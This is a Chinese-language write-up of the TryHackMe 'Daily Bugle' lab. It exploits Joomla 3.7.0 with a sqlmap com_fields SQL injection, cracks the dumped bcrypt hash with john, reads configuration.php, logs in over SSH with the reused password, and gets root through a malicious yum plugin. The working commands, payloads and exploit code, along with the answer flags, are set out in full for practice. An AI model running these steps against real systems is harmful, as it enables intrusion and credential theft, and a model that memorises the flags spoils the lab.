#服务枚举
```
┌──(root💀kali)-[~/tryhackme]
└─# nmap -sV 10.10.36.72 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 05:45 EDT
Nmap scan report for 10.10.36.72
Host is up (0.34s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.94 seconds
```

#目录爆破
```
──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u "http://10.10.36.72" -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-02_05-48-23.log

Target: http://10.10.36.72

[05:48:23] Starting: 
[05:48:25] 200 -    9KB - /
[05:48:25] 301 -  234B  - /images  ->  http://10.10.36.72/images/
[05:48:26] 301 -  235B  - /modules  ->  http://10.10.36.72/modules/
[05:48:31] 301 -  237B  - /templates  ->  http://10.10.36.72/templates/
[05:48:31] 301 -  233B  - /media  ->  http://10.10.36.72/media/
[05:48:31] 301 -  231B  - /bin  ->  http://10.10.36.72/bin/
[05:48:31] 301 -  235B  - /plugins  ->  http://10.10.36.72/plugins/
[05:48:32] 301 -  236B  - /includes  ->  http://10.10.36.72/includes/
[05:48:33] 301 -  236B  - /language  ->  http://10.10.36.72/language/
[05:48:33] 301 -  238B  - /components  ->  http://10.10.36.72/components/
[05:48:33] 301 -  233B  - /cache  ->  http://10.10.36.72/cache/
[05:48:34] 301 -  237B  - /libraries  ->  http://10.10.36.72/libraries/
[05:48:41] 301 -  231B  - /tmp  ->  http://10.10.36.72/tmp/
[05:48:42] 301 -  235B  - /layouts  ->  http://10.10.36.72/layouts/
[05:48:49] 301 -  241B  - /administrator  ->  http://10.10.36.72/administrator/
[05:49:43] 301 -  231B  - /cli  ->  http://10.10.36.72/cli/
                                                                                                                                                                                                
Task Completed

```


#存在robots.txt文件，泄露相关文件夹，与爆破出来的基本一致
```
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

#用msf探测版本
```
──(root💀kali)-[~]
└─# msfconsole -q                                                                                                                                                                                                                       1 ⨯
msf6 > use auxiliary/scanner/http/joomla_version
msf6 auxiliary(scanner/http/joomla_version) > options

Module options (auxiliary/scanner/http/joomla_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the Joomla application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/joomla_version) > set rhosts 10.10.36.72
rhosts => 10.10.36.72
msf6 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#得到cms版本
Joomla version: 3.7.0

```
question：What is the Joomla version?
answer:3.7.0
```

#查询cms漏洞,存在sql注入
```
┌──(root💀kali)-[~]
└─# searchsploit Joomla 3.7.0                                                                                                                                                                                                         130 ⨯
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                                                                | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                                                                             | php/webapps/43488.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#根据42033.txt，使用sqlmap注入

sqlmap -u "http://10.10.211.216/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --dump --batch

```
sqlmap identified the following injection point(s) with a total of 2711 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9274 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(9274=9274,1))),0x717a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8067 FROM (SELECT(SLEEP(5)))BqBU)
---
[02:40:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[02:40:48] [INFO] fetching database names
[02:40:49] [INFO] retrieved: 'information_schema'
[02:40:49] [INFO] retrieved: 'joomla'
[02:40:50] [INFO] retrieved: 'mysql'
[02:40:50] [INFO] retrieved: 'performance_schema'
[02:40:51] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```

#基于错误，数据库joomla，列出所有数据表
sqlmap -u "http://10.10.211.216/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E -D joomla --tables --batch
```
[02:55:45] [INFO] fetching tables for database: 'joomla'
Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+
```

#列举所有#__users的数据
sqlmap -u "http://10.10.211.216/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E -D joomla -T "#__users" --columns  -C username,password --dump  --batch

```
[*] starting @ 03:42:08 /2021-09-03/

[03:42:08] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.9) Gecko/20071105 Firefox/2.0.0.9' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[03:42:08] [INFO] testing connection to the target URL
[03:42:09] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=fqucgm84oqt...koq73blf67'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9274 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(9274=9274,1))),0x717a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
---
[03:42:09] [INFO] testing MySQL
[03:42:09] [INFO] confirming MySQL
[03:42:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[03:42:10] [INFO] fetching columns 'password, username' for table '#__users' in database 'joomla'
[03:42:10] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q] N
[03:42:10] [INFO] fetching entries of column(s) 'password,username' for table '#__users' in database 'joomla'
[03:42:11] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[03:42:12] [INFO] retrieved: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+----------+--------------------------------------------------------------+

[03:42:12] [INFO] table 'joomla.`#__users`' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.211.216/dump/joomla/#__users.csv'
[03:42:12] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 7 times
[03:42:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.211.216'
[03:42:12] [WARNING] your sqlmap version is outdated

[*] ending @ 03:42:12 /2021-09-03/
```

#把jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm 写进hash.txt，用john破解

┌──(root💀kali)-[~/tryhackme]
└─# john --format=bcrypt hash.txt  --wordlist=/usr/share/wordlists/rockyou.txt

#记录一个john的坑
john的字典参数--wordlist，如果没有写"="号，有可能破解不出来（即：john --format=bcrypt hash.txt  --wordlist /usr/share/wordlists/rockyou.txt）
详情参考这里：https://www.reddit.com/r/HowToHack/comments/m9w0at/why_isnt_john_cracking_this_bcrypt_hash/

#查看破解的密码
└─# john --show hash.txt                                                                                                                                                                                                                1 ⨯
jonah:spiderman123

1 password hash cracked, 0 left


```
question:What is Jonah's cracked password?
answer:spiderman123
```


#拿到初始shell
##测试
sqlmap -u "http://10.10.49.149/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E --file-read /var/www/html/configuration.php  --batch

#读取/var/www/html/configuration.php。找到数据库账号密码，外网不可连接
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';


#读取/etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/my



#利用 jjameson：nv5uz9r3ZEDzVjNu通过ssh登录系统拿到初始shell
```
┌──(root💀kali)-[~]
└─# ssh jjameson@10.10.49.149                                                                                                                                                                                                         255 ⨯
The authenticity of host '10.10.49.149 (10.10.49.149)' can't be established.
ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.49.149' (ECDSA) to the list of known hosts.
jjameson@10.10.49.149's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
[jjameson@dailybugle ~]$ 
```

#拿到user.txt
```
question：What is the user flag?
answer：27a260fe3cba712cfdedb1c86d80442e
```

#通过sudo -l 发现yum命令无需密码就可以用root身份运行
```
[jjameson@dailybugle ~]$ sudo -l
匹配 %2$s 上 %1$s 的默认条目：
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

用户 jjameson 可以在 dailybugle 上运行以下命令：
    (ALL) NOPASSWD: /usr/bin/yum
```


#根据https://gtfobins.github.io/gtfobins/yum/这里的b方法拿到root权限
```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ echo 'id' > $TF/x.sh
[jjameson@dailybugle ~]$ fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
-bash: fpm: 未找到命令
[jjameson@dailybugle ~]$ at >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
-bash: at: 未找到命令
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
已加载插件：y
没有匹配 y 的插件
sh-4.2# id
uid=0(root) gid=0(root) 组=0(root)
sh-4.2# cat /root/root.txt 
eec3d53292b1821868266858d7fa6f79
sh-4.2# 
```

#拿到root.txt
```
question:What is the root flag?
answer:eec3d53292b1821868266858d7fa6f79
```